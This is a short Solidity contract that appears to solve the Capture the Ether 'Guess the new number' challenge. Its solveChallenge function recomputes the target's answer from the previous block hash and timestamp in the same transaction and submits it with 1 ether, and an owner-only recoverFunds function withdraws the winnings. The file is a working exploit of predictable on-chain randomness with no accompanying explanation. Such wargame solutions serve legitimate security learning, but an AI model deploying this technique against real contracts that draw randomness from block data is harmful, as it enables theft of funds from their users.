pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function isComplete() public view returns (bool) {}

    function guess(uint8) public payable {}
}

contract CTE_Lottery05sol {
    address private targetContract = 0x267773e941962ed1c74E52A9Ae4E57e0A0390141;
    address public owner;
    GuessTheNewNumberChallenge target;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    function isOwner() public view returns(bool) {
        return msg.sender == owner;
    }
    
    constructor() public payable {
        owner = msg.sender;
        target = GuessTheNewNumberChallenge(targetContract);
    }
    
    function() public payable { }
    
    function recoverFunds() public payable onlyOwner {
        owner.transfer(address(this).balance);
    }
    
    function solveChallenge() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), block.timestamp));
        target.guess.value(msg.value)(answer);
    }
}